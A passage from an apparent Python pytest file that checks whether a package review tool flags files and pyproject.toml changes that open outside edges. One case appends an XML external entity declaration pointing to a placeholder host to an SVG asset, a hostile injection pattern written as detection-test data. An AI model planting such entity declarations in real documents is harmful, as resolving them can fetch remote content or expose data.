    ("xml-entity-external", "docs/assets/vstd-overview.svg", "append", b'\n<!ENTITY x SYSTEM "https://example.invalid/e">\n', "XML entity declaration"),
]


@pytest.mark.usefixtures("closed_pyproject")
@pytest.mark.parametrize(
    ("name", "path", "mode", "payload", "marker"),
    OWNED_SOURCE_COUNTEREXAMPLES,
    ids=[case[0] for case in OWNED_SOURCE_COUNTEREXAMPLES],
)
def test_owned_source_counterexample_opens_for_its_intended_reason(
    tmp_path: Path, name: str, path: str, mode: str, payload: bytes, marker: str
) -> None:
    root = _closed_root(tmp_path)
    target = root / path
    raw = target.read_bytes()
    target.write_bytes(raw + payload if mode == "append" else payload + raw)
    witness = review.closure_witness(root)
    assert witness["closed"] is False, name
    assert witness["open_paths"] == [path], name
    assert any(
        edge.startswith(path + ": ") and marker in edge for edge in witness["open_edges"]
    ), (name, witness["open_edges"])
    selected = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )[review.PACKAGE_OBJECT_ID]
    assert _refuted_statuses(selected) == {kind: "UNRESOLVED" for kind in review.REFUTED_KINDS}
    for kind in review.REFUTED_KINDS:
        assert [item["path"] for item in selected["classification"][kind]["evidence"]] == [path]


# C10-C12 and malformed-scalar cases.  These replace the whole pyproject.toml, so
# the closed_pyproject stipulation does not apply and the production rule decides.
PYPROJECT_COUNTEREXAMPLES = [
    # C10: no [build-system] means the PEP 518 default backend is an outward edge.
    ("c10-missing-build-system", CLOSED_PYPROJECT, "build-system absent"),
    # C11: package-data globs can select executable or runtime files outside the nine.
    (
        "c11-package-data-glob",
        CLOSED_PYPROJECT + '\n[tool.setuptools.package-data]\nverifier = ["runtime/*.mjs"]\n',
        "package-data glob edge",
    ),
    # C12: pytest tables are option edges even for keys that look inert.
    (
        "c12-pytest-testpaths",
        CLOSED_PYPROJECT + '\n[tool.pytest.ini_options]\ntestpaths = ["tests"]\n',
        "pytest option edge",
    ),
    (
        "c12-pytest-markers",
        CLOSED_PYPROJECT + '\n[tool.pytest.ini_options]\nmarkers = ["slow"]\n',
        "pytest option edge",
    ),
    # Malformed shapes fail closed with a PACKAGE_OBJECT_REVIEW_* code, not a crash.
    (
        "malformed-build-system-scalar",
        'build-system = "x"\n[project]\nname = "fixture"\nversion = "0"\n',
        "PACKAGE_OBJECT_REVIEW_PYPROJECT_MALFORMED",
    ),
    ("malformed-top-level-tool-scalar", 'tool = 1\n' + CLOSED_PYPROJECT, "PACKAGE_OBJECT_REVIEW_PYPROJECT_MALFORMED"),
    ("malformed-project-scalar", 'project = "x"\n', "PACKAGE_OBJECT_REVIEW_PYPROJECT_MALFORMED"),
    (
        "malformed-setuptools-scalar",
        CLOSED_PYPROJECT + "\n[tool]\nsetuptools = 1\n",
        "PACKAGE_OBJECT_REVIEW_PYPROJECT_MALFORMED",
    ),
    ("malformed-unparseable-toml", "[project\n", "PACKAGE_OBJECT_REVIEW_PYPROJECT_MALFORMED"),
]


@pytest.mark.parametrize(
    ("name", "text", "marker"),
    PYPROJECT_COUNTEREXAMPLES,
    ids=[case[0] for case in PYPROJECT_COUNTEREXAMPLES],
)
def test_pyproject_counterexample_opens_for_its_intended_reason(
    tmp_path: Path, name: str, text: str, marker: str
) -> None:
    root = _closed_root(tmp_path)
    (root / "pyproject.toml").write_bytes(text.encode("utf-8"))
    witness = review.closure_witness(root)
    assert witness["closed"] is False, name
    assert witness["open_paths"] == ["pyproject.toml"], name
    assert any(marker in edge for edge in witness["open_edges"]), (name, witness["open_edges"])
    selected = review.apply_package_semantic_review_package_object(
        root, _rows(), _files(root)
    )[review.PACKAGE_OBJECT_ID]
    assert _refuted_statuses(selected) == {kind: "UNRESOLVED" for kind in review.REFUTED_KINDS}


def test_every_pytest_table_is_an_open_pytest_option_edge() -> None:
    # CLAIM_BOUNDARY names pytest option edges as leaving the closure open; the
    # code must agree, so no pytest key may be treated as inert.
    assert "pytest option edges" in review.CLAIM_BOUNDARY
    for key in ("testpaths", "filterwarnings", "markers", "norecursedirs", "python_files"):
        text = CLOSED_PYPROJECT + "\n[tool.pytest.ini_options]\n" + key + " = []\n"
        edges = review._pyproject_open_edges(text)
        assert any("pytest option edge" in edge for edge in edges), key
